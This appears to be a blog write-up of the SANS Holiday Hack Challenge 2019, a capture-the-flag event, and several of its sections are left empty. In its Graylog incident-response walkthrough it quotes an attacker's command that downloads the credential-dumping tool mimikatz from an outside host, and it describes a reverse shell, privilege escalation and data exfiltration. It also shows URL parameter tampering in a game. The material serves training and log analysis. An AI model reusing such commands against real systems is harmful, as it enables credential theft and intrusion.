---
layout: default
title: HHC 2019
permalink: /hhc2019/
---

# Holiday Hack Challenge 2019
This christmas season I attended [Kringlecon 2: Turtle Doves](https://2019.kringlecon.com/invite) at the North Pole and participated in the [SANS Holiday Hack Challenge](https://holidayhackchallenge.com/2019/).  As always, it was a fantastic experience filled with much fun and learning.  I want to send a huge thanks to the Counter Hack team and SANS for putting on such a great event!

Without further ado, here's my experience.

## Table of Contents
* [Arriving at the North Pole](#arriving-at-the-north-pole)
* [Terminal Challenges](#terminal-challenges)
    * [Escape Ed](#escape-ed)
    * [Frosty Keypad](#frosty-keypad)
    * [Graylog](#graylog)
    * [Holiday Hack Trail](#holiday-hack-trail)
    * [Linux Path](#linux-path)
    * [Mongo Pilfer](#mongo-pilfer)
    * [Nyanshell](#nyanshell)
    * [Smart Braces](#smart-braces)
    * [Xmas Cheer Laser](#xmas-cheer-laser)
* [Objectives](#objectives)
    * [Objective 0: Talk to Santa in the Quad](#objective-0-talk-to-santa-in-the-quad)
    * [Objective 1: Find the Turtle Doves](#objective-1-find-the-turtle-doves)
    * [Objective 2: Unredact Threatening Document](#objective-2-unredact-threatening-document)
    * [Objective 3: Windows Log Analysis: Evaluate Attack Outcome](#objective-3-windows-log-analysis-evaluate-attack-outcome)
    * [Objective 4: Windows Log Analysis: Determine Attacker Technique](#objective-4-windows-log-analysis-determine-attacker-technique)
    * [Objective 5: Network Log Analysis: Determine Compromised System](#objective-5-network-log-analysis-determine-compromised-system)
    * [Objective 6: Splunk](#objective-6-splunk)
    * [Objective 7: Get Access to the Steam Tunnels](#objective-7-get-access-to-the-steam-tunnels)
    * [Objective 8: Bypassing the Frido Sleigh CAPTEHA](#objective-8-bypassing-the-frido-sleigh-capteha)
    * [Objective 9: Retrieve Scraps of Paper from Server](#objective-9-retrieve-scraps-of-paper-from-server)
    * [Objective 10: Recover Cleartext Document](#objective-10-recover-cleartext-document)
    * [Objective 11: Open the Sleigh Shop Door](#objective-11-open-the-sleigh-shop-door)
    * [Objective 12: Filter Out Poisoned Sources of Weather Data](#objective-12-filter-out-poisoned-sources-of-weather-data)
* [Narrative](#narrative)

## Arriving at the North Pole
Upon arriving at the North Pole, I was greeted by Santa himself.

![Santa at the North Pole](/assets/images/kringlecon_santa.png)

> Welcome to the North Pole and KringleCon 2!
>
> Last year, KringleCon hosted over 17,500 attendees and my castle got a little crowded.
>
> We moved the event to Elf University (Elf U for short), the North Pole’s largest venue.
>
> Please feel free to explore, watch talks, and enjoy the con!

With this conversation with Santa, I unlocked my first [narrative](#narrative).  I also came across my first [terminal challenge](#terminal-challenges).  KringleCon 2 is officially under way!

In the rest of this report, I will walk through each terminal challenge and objective put forth before me.  Cheers and happy hacking!

## Terminal Challenges

| Elf                | Name                          | Location           | Provides Hints For           |
|--------------------|-------------------------------|--------------------|------------------------------|
| Alabaster Snowball | [Nyanshell](#nyanshell)       | Speaker Unpreparedness Room  | [Objective 8](#objective-8-bypassing-the-frido-sleigh-capteha) |
| Bushy Evergreen    | [Escape ed](#escape-ed)       | Train Station      | [Objective 3](#objective-3-windows-log-analysis-evaluate-attack-outcome) |
| Holly Evergreen    | [Mongo Pilfer](#mongo-pilfer) | Netwars Room       | [Objective 10](#objective-10-recover-cleartext-document) |
| Kent Tinseltooth   | [Smart Braces](#smart-braces) | Student Union      | [Objective 11](#objective-11-open-the-sleigh-shop-door) |
| Minty Candy Cane   | [Holiday Hack Trail](#holiday-hack-trail)  | Dormitory          | [Objective 7](#objective-7-get-access-to-the-steam-tunnels)   |
| Pepper Minstix     | [Graylog](#graylog)           | Dormitory          | [Objective 9](#objective-9-retrieve-scraps-of-paper-from-server)   |
| Sparkle Redberry   | [Xmas Cheer Laser](#xmas-cheer-laser) | The Laboratory     | [Objective 5](#objective-5-network-log-analysis-determine-compromised-system)   |
| SugarPlum Mary     | [Linux Path](#linux-path)      | Hermey Hall        | [Objective 4](#objective-4-windows-log-analysis-determine-attacker-technique)   |
| Tangle Coalbox     | [Frosty Keypad](#frosty-keypad)  | The Quad           | Dormitory Access             |

### Escape ed[](#escape_ed)

In the Train Station, Busy Evergreen introduces us to the Escape Ed terminal challenge.

> Hi, I'm Bushy Evergreen. Welcome to Elf U!
>
> I'm glad you're here. I'm the target of a terrible trick.
>
> Pepper Minstix is at it again, sticking me in a text editor.
>
> Pepper is forcing me to learn ed.
>
> Even the hint is ugly. Why can't I just use Gedit?
>
> Please help me just quit the grinchy thing.

#### Hints
[ed Editor Basics](http://cs.wellesley.edu/~cs249/Resources/ed_is_the_standard_text_editor.html)

#### Walkthrough

![Escape ed Terminal](/assets/images/escape_ed1.png)

Upon entering the terminal, we were dropped into the ed editor, a linux-based editor similar to vi. To complete the challenge, we must exit the ed editor.

To exit the ed editor, we simply type "wq" and press enter.  Upon doing this, the editor exits and we get the "You did it! Congratulations!" message indicating that we completed the challenge successfully!

![Escape ed Success](/assets/images/escape_ed2.png)

Completing this terminal gave us the achievement "Escape Ed".

Bushy rewarded us greatly for helping him with this task, including dropping two hints that will come in handy on [Objective 3](#objective3)

> Wow, that was much easier than I'd thought.
> 
> Maybe I don't need a clunky GUI after all!
> 
> Have you taken a look at the password spray attack artifacts?
> 
> I'll bet that DeepBlueCLI tool is helpful.
> 
> You can check it out on GitHub.
> 
> It was written by that Eric Conrad.
> 
> He lives in Maine - not too far from here!

### Frosty Keypad

While exploring the quad at ElfU, we come across the Dormitory.  The only problem is, there's a keypad on the locked door and we don't know the code.  Tangle Coalbox is also there and he asks for our help getting the door open, along with a few things he knows about the code.

> Hey kid, it's me, Tangle Coalbox.
> 
> I'm sleuthing again, and I could use your help.
> 
> Ya see, this here number lock's been popped by someone.
> 
> I think I know who, but it'd sure be great if you could open this up for me.
> 
> I've got a few clues for you.
> 
>   * One digit is repeated once.
>   * The code is a prime number.
>   * You can probably tell by looking at the keypad which buttons are used.

#### Hints

The following hint was given to us by Tangle Coalbox.

One digit is repeated once, it's prime, and you can see which keys were used

#### Walkthrough

First, we looked at the keypad to see what Tangle was talking about with us being able to see which keys were used.

![Frosty keypad](/assets/images/keypad1.png)

Sure enough, there is much more residue on 3 numbered keys: 1, 3, and 7.  

In testing the keypad, we found that it can accept up to 8 digits.  Knowing that the numbers 1, 3, and 7 are used paired with the tip that one of those digits is repeated, we deduced that the final code is between 4 and 8 characters.  However, since Tangle's hint implied that only one of those numbers is repeated, and an 8 digit code would require multiple repeats, we decided to take an aggressive approach and assume that the code is only 4 digits.

With all this in mind, we turned to our trusty scripting language, Python.  The goal was to write a program that generated all the prime numbers between

Here is the script we used.

```
import re

start = 1137
end = 7731
prime_nums = []
  
for val in range(start, end + 1):    
   # If num is divisible by any number   
   # between 2 and val, it is not prime  
   if val > 1: 
       for n in range(2, val): 
           if (val % n) == 0: 
               break
       else: 
           prime_nums.append(val)

possible_sols = []
for p in prime_nums:
	if bool(re.match('^[137]+$', str(p))):
		possible_sols.append(p)
print(possible_sols)
```

In the first part of the script, we define our start and end values.  1137 is the smallest possible four-digit value with only one of the three digits repeated and 7731 is the largest such value, so we assign those as our start and end.

Then we use the for loop block to check if each number is prime or not.  If it is we add it to the list prime_nums.  This generates a list of 792 prime numbers.  (Thanks to [Shivam_k at GeeksforGeeks](https://www.geeksforgeeks.org/python-program-to-print-all-prime-numbers-in-an-interval/) for the sample code on this one.)

Next we iterate through each of the prime numbers and rule out any that have digits other than 1, 3, or 7.  To do this, we use a regex match.  Our regex is '^[137]+$'.  The [137] indicates we should match on any digit that is the value 1, 3, or 7.  The plus sign indicates we should look for this match more than one time.  And the ^ and $ indicate that these matches should be anchored to both the start and end of the string.  This ensures that every digit in the string is either a 1, 3 or 7 and not just some of them.  Then we print out the results.

When we run this, it takes us from a list of 792 prime numbers to a list of 14 possible solutions:

```
[1171, 1373, 1733, 1777, 3137, 3313, 3331, 3371, 3373, 3733, 7177, 7331, 7333, 7717]
```

Looking through this list, there are only a few numbers in it that meet the requirement of using all three expected digits with only one repeated digit.  Those are:
* 1373
* 1733
* 3137
* 3371
* 7331

At this point we began trying these numbers on the keypad and crossing our fingers that it didn't have a lockout functionality!

Alas, the final try with value 7331 worked and we were able to enter the dormitory!

![Frosty keypad success](/assets/images/keypad2.png)

### Graylog

Upon entering the dormitory after accomplishing the [Frosty Keypad](#frosty-keypad) terminal challenge, we met Pepper Minstix in the common area.  He seemed a little troubled by something.

> It's me - Pepper Minstix.
> 
> Normally I'm jollier, but this Graylog has me a bit mystified.
> 
> Have you used Graylog before? It is a log management system based on Elasticsearch, MongoDB, and Scala.
> 
> Some Elf U computers were hacked, and I've been tasked with performing incident response.
> 
> Can you help me fill out the incident response report using our instance of Graylog?
> 
> It's probably helpful if you know a few things about Graylog.
> 
> Event IDs and Sysmon are important too. Have you spent time with those?
> 
> Don't worry - I'm sure you can figure this all out for me!
> 
> Click on the All messages Link to access the Graylog search interface!
> 
> Make sure you are searching in all messages!
> 
> The Elf U Graylog server has an integrated incident response reporting system. Just mouse-over the box in the lower-right corner.
> 
> Login with the username elfustudent and password elfustudent.

#### Walkthrough

![Graylog](/assets/images/graylog1.png)

Hovering over the bottom right corner gave us access to the ElfU Graylog Incident Response Report, which posed the following questions that had to be answered to accomplish this challenge.  (Note that the Graylog interface can be accessed directly at [https://graylog.elfu.org/](https://graylog.elfu.org/) for easier viewing but doesn't include the report questions.)
1. Minty CandyCane reported some weird activity on his computer after he clicked on a link in Firefox for a cookie recipe and downloaded a file.  What is the full-path + filename of the first malicious file downloaded by Minty?
2. The malicious file downloaded and executed by Minty gave the attacker remote access to his machine. What was the ip:port the malicious file connected to first?
3. What was the first command executed by the attacker? (answer is a single word)
4. What is the one-word service name the attacker used to escalate privileges?
5. What is the file-path + filename of the binary ran by the attacker to dump credentials?
6. The attacker pivoted to another workstation using credentials gained from Minty's computer. Which account name was used to pivot to another machine?
7. What is the time ( HH:MM:SS ) the attacker makes a Remote Desktop connection to another machine?
8. The attacker navigates the file system of a third host using their Remote Desktop Connection to the second host. What is the SourceHostName,DestinationHostname,LogonType of this connection? (submit in that order as csv)
9. What is the full-path + filename of the secret research document after being transferred from the third host to the second host?
10. What is the IPv4 address (as found in logs) the secret research document was exfiltrated to?

Sensing Pepper's frustration, we dove right in.  First, we clicked on All Messages to bring up the search interface and changed the time dropdown to include all messages.

![Show all messages](/assets/images/graylog2.png)

**Minty CandyCane reported some weird activity on his computer after he clicked on a link in Firefox for a cookie recipe and downloaded a file.  What is the full-path + filename of the first malicious file downloaded by Minty?**

To start, we needed to poke around the logs a bit.  It appeared that there were a lot of sysmon logs.  According to the [Sysmon Event documentation](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon#events), the event ID corresponding with a file creation seemed to be Event ID 2, so to start we added the filter `EventID:2`

Next, we want to see what process created the file.  This can be viewed in the ProcessImage field.  Since Minty was browsing Firefox at the time, we would expect this process image to be Firefox.

In the Fields selector on the left, we clicked the ProcessImage field and selected "Quick values" to generate a chart of the values of that field.  Sure enough, we see firefox.exe.  We click the magnifying glass next to it to add it to our search (`ProcessImage:"C:\\Program Files\\Mozilla Firefox\\firefox.exe"`) to show us just the files written by the firefox process.

![Process Image values](/assets/images/graylog3.png)

We repeat the Quick values process for the TargetFilename field which indicates the name of the file that was written.  There are a lot of files which have an extension of .temp and don't seem to be related to what we are looking for.  But there is also one file that is not a .temp in the Quick Values chart and that is **C:\Users\minty\Downloads\cookie_recipe.exe** which seems to be our answer.  We submit it to the report to confirm that it is!

While looking at the log entry which indicates this, we also see that Minty's workstation has a hostname of elfu-res-wks1 which might come in handy later.

**The malicious file downloaded and executed by Minty gave the attacker remote access to his machine. What was the ip:port the malicious file connected to first?**

Next we are looking for a remote connection.  Going back to the sysmon documentation, we know to look for Event ID 3 which corresponds to a network connection.  We want to pivot to search for logs with a process name of the file we just found since it launched the remote connection and with an Event ID of 3.  The new query becomes `ProcessImage:C\:\\Users\\minty\\Downloads\\cookie_recipe.exe AND EventID:3`.  This gives us all the network connections made from Minty's computer.

When we do the Quick Values process for the Destination IP field, we see exactly one IP address that calls are made to: 192.168.247.175.  Viewing the single log entry that showed up reveals that the port number connected on was 4444.  Very suspicious.  Now we know that the connection was made to **192.168.247.175:4444**.

In viewing the log, we also see that the source IP for Minty's workstation is 192.168.247.177 which might come in handy later.  We also see that the process ID for the cookie_recipe.exe file is 5256 which could be helpful.

**What was the first command executed by the attacker? (answer is a single word)**

To determine this, we need to view processes spawned by cookie_recipe.exe.  So we create a new search on the parent process ID using the ID we found in the previous step.  Thus, our search becomes `ParentProcessId:5256`.

This shows us many logs from a Powershell process, which seems like it could be where a command is executed by the attacker.  We sort the logs to see the earliest first and expand the log entry to view the command line.  The screenshot below shows that the command **whoami** was run first.

![whoami command log](/assets/images/graylog4.png)

**What is the one-word service name the attacker used to escalate privileges?**

Using the same search as above (`ParentProcessId:5256`), we can review additional logs and view the command line that was run for each.  To do this, check the CommandLine box in the fields pane on the left.

At 5:28:32.000, we see a web request to download a file cookie_recipe2.exe.  This definitely looks like it could be our second stage malware.

![download cookie recipe 2](/assets/images/graylog5.png)

Continuing on we see the attacker attempt to run this newly downloaded file with the command line `./cookie_recipe2.exe` but it must not have worked.  The next attempt we see to run the newly downloaded file is interesting.  First it tries to start a service and uses that to run the file. 

![privilege escalation with web ex service](/assets/images/graylog6.png)

It appears that it got the attacker a couple of tries to get the right syntax, but eventually they must have gotten it.  The one-word service name used to escalate privileges in this case is **webexservice**.

**What is the file-path + filename of the binary ran by the attacker to dump credentials?**

The attacker most likely used this second stage malware running with higher privileges to dump credentials on the system.  Now we pivot our search to look for the actions that our new process, cookie_recipe2.exe, might have taken by using the search `ParentProcessImage:C\:\\Users\\minty\\Downloads\\cookie_recipe2.exe`.

If we view the Quick Values for the Command Line field here, we see the command line `C:\Windows\system32\cmd.exe /c "Invoke-WebRequest -Uri http://192.168.247.175/mimikatz.exe -OutFile C:\cookie.exe"`.  We know that mimikatz.exe is a tool commonly used by attackers for dumping credentials from memory, so this is likely a good place to look.  The file was downloaded with the name and path of C:\cookie.exe, which if we review the logs, is executed shortly after the download.  **C:\cookie.exe** is our answer!

**The attacker pivoted to another workstation using credentials gained from Minty's computer. Which account name was used to pivot to another machine?**

Since we're looking for a user account, we want to search for logs where the AccountName field has a value.  The filter `_exists_:AccountName` can be used for this.

We want to confirm that the user account that exists is logged in a login event.  If we look at the quick values for the EventID field, there appears to be some non-sysmon event ids.  These are likely Windows Event Ids.  If we Google the first non-sysmon event id (4624), we find that it's the event id for the event "An account was successfully logged on".  This looks promising!  Now we add that event id to the filter so that it becomes `_exists_:AccountName AND EventID:4624`.

Now if we review the logs, we do see a few logs for logon with the account SYSTEM, but that doesn't really make sense here.  However, there are a lot of logs for logons of the account alabaster.  That must be it.  The attacker used the account **alabaster** to pivot to the new machine.  Note that the machine logged into here is elfu-res-wks2.  This might come in handy.

**What is the time ( HH:MM:SS ) the attacker makes a Remote Desktop connection to another machine?**

To find the time that the attacker made the RDP connection to this other machine, we need to pivot with the information we just discovered.  Now we know that the logon happened on elfu-res-wks2, so we can update our filter to be `EventID:4624 AND DestinationHostname:elfu-res-wks2`.

Next, if we look at the [documentation](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4624) for the event id 4624 and look through the information on the various Logon Types, we see that Logon Type 10 corresponds to a logon over RDP.  Now we add `AND LogonType:10` to our filter.

This latest filter provides us with a single log entry which occurred at **06:04:28**.

**The attacker navigates the file system of a third host using their Remote Desktop Connection to the second host. What is the SourceHostName,DestinationHostname,LogonType of this connection? (submit in that order as csv)**

From the previous step, we know that the source hostname is elfu-res-wks2.

As for Logon type, if we go back to the documentation for event id 4624, we can see that logon type 3 corresponds with remotely browsing a file system.  Let's update our search to say `EventID:4624 AND LogonType:3`.

When scrolling through the results, we want to pay attention to the DestinationHostname field, which seems to contain a lot of logs for the hostname elfu-res-wks2, which we aren't concerned with.  Let's add `AND NOT DestinationHostname:elfu-res-wks2` to filter those out.

If we view the Quick Values for DestinationHostname now, we see there are logs for elfu-res-wks1 and elfu-res-wks3.  We know elfu-res-wks1 is Minty's machine and not the target we are looking for, so that leaves us with elfu-res-wks3.  Thus, our answer becomes **elfu-res-wks2,elfu-res-wks3,3**.

**What is the full-path + filename of the secret research document after being transferred from the third host to the second host?**

We know that the secret document on elfu-res-wks3 was accessed via navigating the file system on elfu-res-wks2.  So we are going to look for logs with a source of elfu-res-wks2.  Additionally, if we review the Sysmon Event IDs, we see that Event ID 2 corresponds to "A process changed a file creation time", so let's filter on that too.  Our filter becomes `source:elfu-res-wks2 AND EventID:2`.  

If we review the Quick Values for the TargetFileName field, we see a lot of .db files, which we don't particularly care about.  They all seem to be located in the AppData folder under alabaster's user account.  We can filter those out by adding `AND NOT TargetFilename:C\:\\Users\\alabaster\\AppData\\* ` to the filter.

Now if we view the Quick Values, we see three files remaining, and one of those looks very promising.  The attacker transferred the file **C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf**.

![secret file](/assets/images/graylog7.png)

**What is the IPv4 address (as found in logs) the secret research document was exfiltrated to?**

To find this, we can search for logs that have the name of the file in them.  Our search is `super_secret_elfu_research.pdf`.  This shows us three logs.

Two of the logs appear to be related to viewing the file on the source systems.  However, if you look at the command line of the third log (at 2019-11-19 6:14:24), we see that the data is exfiltrated to pastebin.com.

To find the IP this was sent to, we need to pivot.  We know that a sysmon network connection log has an EventID of 3.  Additionally, the process ID that initated the pastebin.com connection is 1232.  So let's change our search to `EventID:3 AND ProcessId:1232`.

One log is returned and from there we can see that the secret document was exfiltrated to IP address **104.22.3.84**.

Once we submit all of those answers, we successfully completed the terminal challenge!

![success](/assets/images/graylog8.png)

Pepper Minstix rewarded us for helping him complete this challenge with a couple hints about SQL injection, which will come in handy in [Objective 9](#objective-9-retrieve-scraps-of-paper-from-server)!

> That's it - hooray!
> 
> Have you had any luck retrieving scraps of paper from the Elf U server?
> 
> You might want to look into SQL injection techniques.
> 
> OWASP is always a good resource for web attacks.
> 
> For blind SQLi, I've heard Sqlmap is a great tool.
> 
> In certain circumstances though, you need custom tamper scripts to get things going!


### Holiday Hack Trail

In the Dormitory, we run into Minty Candycane who challenges us to a good 'ole game of Holiday Hack Trail.

> Hi! I'm Minty Candycane!
> 
> I just LOVE this old game!
> 
> I found it on a 5 1/4" floppy in the attic.
> 
> You should give it a go!
> 
> If you get stuck at all, check out this year's talks.
> 
> One is about web application penetration testing.
> 
> Good luck, and don't get dysentery!

#### Hints

[Web Apps: A Trailhead](https://youtu.be/0T6-DQtzCgM)

#### Walkthrough

![terminal](/assets/images/trail1.png)

We select the Easy difficulty to start.  First, we must purchase our supplies for the long journey.  Applying some of the tips in the hint video, we see that the validation is not done on the server side, so by increasing the values in the URL shown at the top of the screen, we can give ourselves a ton more money and, thus, more supplies.

To start, we manipulate the URL and change the money parameter from 5,000 to 50,000.

![url](/assets/images/trail2.png)

![more money](/assets/images/trail3.png)

Now we have 50,000 dollars and can buy a lot more supplies!  Hopefully it's enough to get us to Kringlecon in time.

Once we have our supplies, we set out on the trail.  We notice that each time we press Go to move along the trail.  The distance value in the URL increases.  This corresponds to the distance remaining field in the game.

![Distance](/assets/images/trail4.png)

If we take the two together, we can figure out that the target distance is 8000.  So let's just try to update the URL parameter for distance to 8000.

![Distance 8000](/assets/images/trail5.png)

When we enter that URL, we get to Distance Remaining is 0.  If we press Go one more time, then we get the victory message while successfully avoiding all the terrible things that can happen along the trail!

![Success](/assets/images/trail6.png)

Minty Candycane rewards us for our help by providing us some hints about hacking physical keys to help with [Objective 7](#objective-7-get-access-to-the-steam-tunnels)

> You made it - congrats!
> 
> Have you played with the key grinder in my room? Check it out!
> 
> It turns out: if you have a good image of a key, you can physically copy it.
> 
> Maybe you'll see someone hopping around with a key here on campus.
> 
> Sometimes you can find it in the Network tab of the browser console.
> 
> Deviant has a great talk on it at this year's Con.
> 
> He even has a collection of key bitting templates for common vendors like Kwikset, Schlage, and Yale.


### Linux Path

While wandering around Hermey Hall, we ran into SugarPlum Mary.  She asks for our help in resolving a PATH Problem in Linux.

> Oh me oh my - I need some help!
> 
> I need to review some files in my Linux terminal, but I can't get a file listing.
> 
> I know the command is ls, but it's really acting up.
> 
> Do you think you could help me out? As you work on this, think about these questions:
> 
>   1. Do the words in green have special significance?
>   2. How can I find a file with a specific name?
>   3. What happens if there are multiple executables with the same name in my $PATH?

#### Hints

Green words matter, files must be found, and the terminal's $PATH matters.

#### Walkthrough

![Terminal](/assets/images/path1.png)

In the terminal, I need to get a listing of all the files in the home directory.  To start, I check my current directory and attempt to do a simple ls command.  However, instead of listing the files, I get a message shown below.

![Fail](/assets/images/path2.png)

Next, I check where the ls command I'm running is located using the which command.  Then I use the locate command to locate all instances of ls.

![ls details](/assets/images/path3.png)

It looks like I'm using the ls located at `/usr/local/bin/ls` but there is another ls program located at `/bin/ls`.  The problem is likely that `/bin` is not in my path so when I type ls, the `/bin/ls` version can't be found. To attempt to remedy this, I instead type `/bin/ls`.

Alas, that worked!

![success](/assets/images/path4.png)

To reward me, SugarPlum Mary provided some very helpful hints on Sysmon and EQL to assist with [Objective 4](#objective-4-windows-log-analysis-determine-attacker-technique)

> Oh there they are! Now I can delete them. Thanks!
> 
> Have you tried the Sysmon and EQL challenge?
> 
> If you aren't familiar with Sysmon, Carlos Perez has some great info about it.
> 
> Haven't heard of the Event Query Language?
> 
> Check out some of Ross Wolf's work on EQL or that blog post by Josh Wright in your badge.

### Mongo Pilfer

#### Hints

#### Walkthrough


### Nyanshell

#### Hints

#### Walkthrough


### Smart Braces

In the student union, Kent Tinseltooth introduces us to the Smart Braces terminal challenge.

> OK, this is starting to freak me out!
> 
> Oh sorry, I'm Kent Tinseltooth. My Smart Braces are acting up.
> 
> Do... Do you ever get the feeling you can hear things? Like, voices?
> 
> I know, I sound crazy, but ever since I got these... Oh!
> 
> Do you think you could take a look at my Smart Braces terminal?
> 
> I'll bet you can keep other students out of my head, so to speak.
> 
> It might just take a bit of Iptables work.
> 
> Oh thank you! It's so nice to be back in my own head again. Er, alone.
> 
> By the way, have you tried to get into the crate in the Student Union? It has an interesting set of locks.

#### Hints

[Iptables](https://upcloud.com/community/tutorials/configure-iptables-centos/)

#### Walkthrough

![Smart Braces Terminal](/assets/images/smart_braces1.png)

Upon entering the terminal, we very clearly see Kent's plight.  In order to help him, we must configure the iptables firewall on the system as set forth by the /home/elfuuser/IOTteethBraces.md file.

![IOT teeth braces markdown file](/assets/images/smart_braces2.png)

Using what we know about iptables and the hint provided by Kent, we must configure iptables with the following rules:
1. Set the default policies to DROP for the INPUT, FORWARD, and OUTPUT chains.
2. Create a rule to ACCEPT all connections that are ESTABLISHED,RELATED on the INPUT and the OUTPUT chains.
3. Create a rule to ACCEPT only remote source IP address 172.19.0.225 to access the local SSH server (on port 22).
4. Create a rule to ACCEPT any source IP to the local TCP services on ports 21 and 80.
5. Create a rule to ACCEPT all OUTPUT traffic with a destination TCP port of 80.
6. Create a rule applied to the INPUT chain to ACCEPT all traffic from the lo interface.

However, if we wait too long, Kent won't be able to handle it!  We have to complete the challenge in 5 minutes or less otherwise he'll tear the whole thing down.

![Kent's Impatience](/assets/images/smart_braces3.png)

Alas, we better get to it!

We must enter the following commands for each of the objectives.
1. To set the default policies, we need to issue a command for each of the three policies (using the -P flag) indicating that the action should be to drop the packet.
    * sudo iptables -P FORWARD DROP
	* sudo iptables -P INPUT DROP
	* sudo iptables -P OUTPUT DROP
2. To create a rule accepting established and related packets, we must use the -m flag to load a module "state" which looks at the state of the packet.  Then we append (using the -A flag) a rule to the INPUT and OUTPUT chains whenever the state is ESTABLISHED or RELATED.  If all these conditions are met, we jump (using the -j flag) to the ACCEPT chain to accept the packet.
    * sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
	* sudo iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
3. To create a rule to acept traffic only from the given IP on SSH port 22, we append a rule to the INPUT chain that identifies traffic using the tcp protocol (-p) on port 22 (--dport for destination port) with a source (-s) of the given IP address, 172.19.0.225.  Once again, if met we accept the traffic.
    * sudo iptables -A INPUT -p tcp --dport 22 -s 172.19.0.225 -j ACCEPT
4. To accept any traffic on ports 21 and 80, we perform a very similar command as in the last step, but we leave off the -s flag with the source IP since the traffic can come from anywhere.
    * sudo iptables -A INPUT -p tcp --dport 21 -j ACCEPT
	* sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
5. To allow outgoing traffic on port 80, we perform the same command as the last step, but instead of appending the rule to the INPUT chain (indicating that the traffic is incoming), we append it to the output chain (indicating that the traffic originated on the system).
    * sudo iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT
6. To allow all traffic from the lo interface, we use the -i flag to specify the interface that we want to listen on for packets.  Since we want all traffic on that interface to be accepted, no other parameters are necessary.
    * sudo iptables -A INPUT -i lo -j ACCEPT

When we enter these commands into the terminal, we get a message that we successfully hardened the smart braces firewall.  Great job!

![ip tables success message](/assets/images/smart_braces4.png)

For our help, Kent rewarded us with several hints that will come in handy for [Objective 11](#objective11).  Additionally, if we go look in the Student Union in the corner there is now a mysterious crate with lots of locks on it.  I wonder what's hiding in there.

> Oh thank you! It's so nice to be back in my own head again. Er, alone.
> 
> By the way, have you tried to get into the crate in the Student Union? It has an interesting set of locks.
> 
> There are funny rhymes, references to perspective, and odd mentions of eggs!
> 
> And if you think the stuff in your browser looks strange, you should see the page source...
> 
> Special tools? No, I don't think you'll need any extra tooling for those locks.
> 
> BUT - I'm pretty sure you'll need to use Chrome's developer tools for that one.
> 
> Or sorry, you're a Firefox fan?
> 
> Yeah, Safari's fine too - I just have an ineffible hunger for a physical Esc key.
> 
> Edge? That's cool. Hm? No no, I was thinking of an unrelated thing.
> 
> Curl fan? Right on! Just remember: the Windows one doesn't like double quotes.
> 
> Old school, huh? Oh sure - I've got what you need right here...


### Xmas Cheer Laser

#### Hints

#### Walkthrough


## Objectives

During the course of exploring ElfU, I was challenged with the following objectives.  The sections below explain the steps taken in each objective, including how they were unlocked, any hints that were provided, what steps were taken to solve the objective, and the outcome.  Enjoy!

### Objective 0: Talk to Santa in the Quad

#### Task 

Enter the campus quad and talk to Santa.

#### Walk Through

After leaving the train station, we entered The Quad at ElfU where Santa was waiting for us.

To complete this objective, we talked to Santa in the quad and this is what he had to say.

> This is a little embarrassing, but I need your help.
> 
> Our KringleCon turtle dove mascots are missing!
> 
> They probably just wandered off.
> 
> Can you please help find them?
> 
> To help you search for them and get acquainted with KringleCon, I’ve created some objectives for you. You can see them in your badge.
> 
> Where's your badge? Oh! It's that big, circle emblem on your chest - give it a tap!
> 
> We made them in two flavors - one for our new guests, and one for those who've attended both KringleCons.

Thanks for the tip on the badge Santa!  Talking with Santa also unlocked many of the other objectives below.

#### Solution

Locate Santa in the quad and click on him to say hello.

### Objective 1: Find the Turtle Doves[](#objective1)

#### Task 

Find the missing turtle doves.

#### Walk Through

During the course of exploring ElfU, we entered the Student Union building.  It's a great place for students and visitors alike to hang out and meet people and is conveniently located across the quad from the train station!

Like most places at the North Pole, it was warm and cozy thanks to a roaring fire in the fireplace, which is where we found the two turtle doves, Michael and Jane, relaxing and warming up.

![Michael and Jane - Two Turtle Doves](/assets/images/turtle_doves.png)

Another objective down!

#### Solution

Locate the Two Turtle Doves and click on them to say hello.

### Objective 2: Unredact Threatening Document[](#objective2)

#### Task 
Someone sent a threatening letter to Elf University. What is the first word in ALL CAPS in the subject line of the letter? Please find the letter in the Quad.

#### Walk Through

While exploring ElfU and the quad, we found [a letter](https://downloads.elfu.org/LetterToElfUPersonnel.pdf) in the corner between the Student Union and Hermey Hall.  After picking up the letter, it was found to be heavily redacted.

![Redacted Letter](/assets/images/letter1.png)

However, we paid attention to the news this year, and recalled a certain incident with a [poorly redacted pdf](https://www.wired.com/story/paul-manafort-bad-tech-pdfs-passwords/).  Alas, attempting the same technique of copying and pasting from the pdf revealed that we could still get to the redacted text!

![Copying the Redacted Letter](/assets/images/letter2.png)

And that revealed to us the contents of the redacted letter as follows.

> From: A Concerned and Aggrieved Character
>
> Subject: DEMAND: Spread Holiday Cheer to Other Holidays and Mythical Characters… OR ELSE!
>
> Attention All Elf University Personnel,
>
> It remains a constant source of frustration that Elf University and the entire operation at the North Pole focuses exclusively on Mr. S. Claus and his year-end holiday spree. We URGE you to consider lending your considerable resources and expertise in providing merriment, cheer, toys, candy, and much more to other holidays year-round, as well as to other mythical characters.
>
> For centuries, we have expressed our frustration at your lack of willingness to spread your cheer beyond the inaptly-called “Holiday Season.” There are many other perfectly fine holidays and mythical characters that need your direct support year-round. 
>
> If you do not accede to our demands, we will be forced to take matters into our own hands. We do not make this threat lightly. You have less than six months to act demonstrably. 
>

It appears that someone at the North Pole is not so filled with holiday cheer and is threatening the North Pole and Christmas everywhere!

#### Solution

The first word in ALL CAPS in the subject line of the letter is...

DEMAND


### Objective 3: Windows Log Analysis: Evaluate Attack Outcome[](#objective3)

#### Task 

We're seeing attacks against the Elf U domain! Using [the event log data](https://downloads.elfu.org/Security.evtx.zip), identify the user account that the attacker compromised using a password spray attack. Bushy Evergreen is hanging out in the train station and may be able to help you out.

#### Hints

[Deep Blue CLI on Github](https://github.com/sans-blue-team/DeepBlueCLI)
[Eric Conrad on DeepBlueCLI](https://www.ericconrad.com/2016/09/deepbluecli-powershell-module-for-hunt.html)

#### Walk Through

#### Solution


### Objective 4: Windows Log Analysis: Determine Attacker Technique[](#objective4)

#### Task 

Using [these normalized Sysmon logs](https://downloads.elfu.org/sysmon-data.json.zip), identify the tool the attacker used to retrieve domain password hashes from the lsass.exe process. For hints on achieving this objective, please visit Hermey Hall and talk with SugarPlum Mary.

#### Hints

#### Walk Through

#### Solution

